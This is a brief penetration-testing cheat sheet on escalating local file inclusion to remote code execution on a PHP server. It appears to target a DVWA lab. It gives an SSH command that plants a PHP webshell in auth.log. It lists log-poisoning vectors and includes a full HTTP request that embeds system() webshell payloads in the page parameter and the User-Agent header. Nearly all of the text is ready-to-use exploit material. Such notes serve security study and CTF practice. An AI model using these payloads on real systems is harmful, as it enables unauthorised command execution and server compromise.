# LFI
## LFI to RCE through SSH
`ssh "<?php system(\$_GET['cmd']);?>"@10.10.10.10`
then read `/var/log/auth.log`

## LFI to RCE through log poisoning
*we just gotta poison the logs with anything that reflects in them. that could be:*
1. the get path
2. the user-agent
3. the cookie
*whatever gets logged is a path for RCE*

## Example request
```
GET /vulnerabilities/fi/?page=<?php system($_REQUEST['cmd']);?> HTTP/1.1
Host: 192.168.56.103
User-Agent: Mozilla/5.0 <?php system($_REQUEST['cmd']);?> Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.56.103/vulnerabilities/fi/?page=include.php
Cookie: PHPSESSID=trdtrei248nhd08l4o5hqnspk3; security=low
Upgrade-Insecure-Requests: 1


```